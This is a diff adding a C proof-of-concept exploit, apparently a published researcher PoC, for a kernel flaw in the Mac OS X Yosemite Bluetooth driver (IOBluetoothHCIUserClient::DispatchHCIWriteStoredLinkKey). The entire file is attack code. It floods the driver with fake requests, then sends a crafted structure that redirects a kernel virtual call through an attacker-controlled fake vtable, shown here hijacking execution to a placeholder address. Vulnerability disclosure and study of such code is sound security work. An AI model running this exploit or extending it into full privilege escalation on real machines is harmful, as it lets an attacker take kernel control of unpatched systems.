@@ -1,0 +1,141 @@
+/*
+ * lpe-issue1.c
+ * Written for Mac OS X Yosemite (10.10.1) by @joystick and @rpaleari.
+ *
+ * Exploits IOBluetoothHCIUserClient::DispatchHCIWriteStoredLinkKey()
+ *
+ * gcc -Wall -o lpe-issue1{,.c} -framework IOKit
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+#define SIZE 0x1000
+
+struct BluetoothCall {
+  uint64_t args[7];
+  uint64_t sizes[7];
+  uint64_t index;
+};
+
+#ifndef bswap64
+#   define bswap64(num)							\
+  ( (((uint64_t)(num) << 56)                               )		\
+    | (((uint64_t)(num) << 40) & UINT64_C(0x00FF000000000000))		\
+    | (((uint64_t)(num) << 24) & UINT64_C(0x0000FF0000000000))		\
+    | (((uint64_t)(num) <<  8) & UINT64_C(0x000000FF00000000))		\
+    | (((uint64_t)(num) >>  8) & UINT64_C(0x00000000FF000000))		\
+    | (((uint64_t)(num) >> 24) & UINT64_C(0x0000000000FF0000))		\
+    | (((uint64_t)(num) >> 40) & UINT64_C(0x000000000000FF00))		\
+    | (((uint64_t)(num) >> 56)                               ) )
+#endif
+
+void create_requests(io_connect_t port)
+{
+  struct BluetoothCall a;
+  uint32_t i;
+  kern_return_t kr;
+
+  for (i = 0; i < 7; i++) {
+    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
+    a.sizes[i] = SIZE;
+  }
+
+  /* DispatchHCIRequestCreate() */
+  a.index = 0x0;
+
+  *(uint64_t *)a.args[0] = 5*1000;  /* Timeout */
+  memset((void *)a.args[1], 0x81, 0x1000);
+  memset((void *)a.args[2], 0x82, 0x1000);
+  memset((void *)a.args[3], 0x83, 0x1000);
+  memset((void *)a.args[4], 0x84, 0x1000);
+  memset((void *)a.args[5], 0x85, 0x1000);
+  memset((void *)a.args[6], 0x86, 0x1000);
+
+  for(i = 0; i < 500; i++) {
+    kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
+			     (uint32_t) 0,       /* Selector */
+			     NULL, 0,            /* input, inputCnt */
+			     (const void*) &a,   /* inputStruct */
+			     120,                /* inputStructCnt */
+			     NULL, NULL, NULL, NULL); /* Output stuff */
+
+    if(kr == 0xe00002bd) /* Full */
+      break;
+  }
+}
+
+int main(void) {
+  struct BluetoothCall a;
+  int i;
+  void *landing_page = calloc(SIZE, sizeof(char));
+
+  /* Init a */
+  for (i = 0; i < 7; i++) {
+    a.args[i] = (uint64_t) calloc(SIZE, sizeof(char));
+    a.sizes[i] = SIZE;
+  }
+
+  /* Finding vuln service */
+  io_service_t service =
+    IOServiceGetMatchingService(kIOMasterPortDefault,
+				IOServiceMatching("IOBluetoothHCIController"));
+
+  if (!service) {
+    return -1;
+  }
+
+  /* Connect to vuln service */
+  io_connect_t port = (io_connect_t) 0;
+  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
+  IOObjectRelease(service);
+  if (kr != kIOReturnSuccess) {
+    return kr;
+  }
+
+  /* Populating with fake requests. */
+  create_requests(port);
+
+  /* IOBluetoothHCIUserClient::DispatchHCIWriteStoredLinkKey() */
+  a.index = 42;
+  /* Req number */
+  *((uint32_t *)a.args[0]) = 1;
+  /* num_of_keys */
+  *((uint32_t *)a.args[1]) = 0x20;
+
+  /* Padding */
+  memset((void *)a.args[3], 0x33, 152);
+  /* mov     rdi, [r14+0AB8h] */
+  *((uint64_t *)(a.args[3]+152)) = bswap64((uint64_t)landing_page);
+  /* mov rax, [rdi] */
+  *((uint64_t *)((uint64_t)landing_page)) = (uint64_t)landing_page;
+  /* call [rax+0x1d0]: this will trigger a #GP calling 0x4141414142424242 */
+  *((uint64_t *)((uint64_t)landing_page+0x1d0)) = (uint64_t) 0x4141414142424242;
+
+  /* Here some fixing to the vtable is required to return cleanly after the exploit */
+
+#if 0
+  /* Debug print */
+  for(i = 0; i < 120; i++) {
+    if(i % 8 == 0) printf("\n");
+    printf("\\x%02x", ((unsigned char *)&a)[i]);
+  }
+  printf("\n");
+#endif
+
+  kr = IOConnectCallMethod((mach_port_t) port, /* Connection */
+			   (uint32_t) 0,       /* Selector */
+			   NULL, 0,            /* input, inputCnt */
+			   (const void*) &a,   /* inputStruct */
+			   120,                /* inputStructCnt */
+			   NULL, NULL, NULL, NULL); /* Output stuff */
+  printf("kr: %08x\n", kr);
+
+  return IOServiceClose(port);
+}
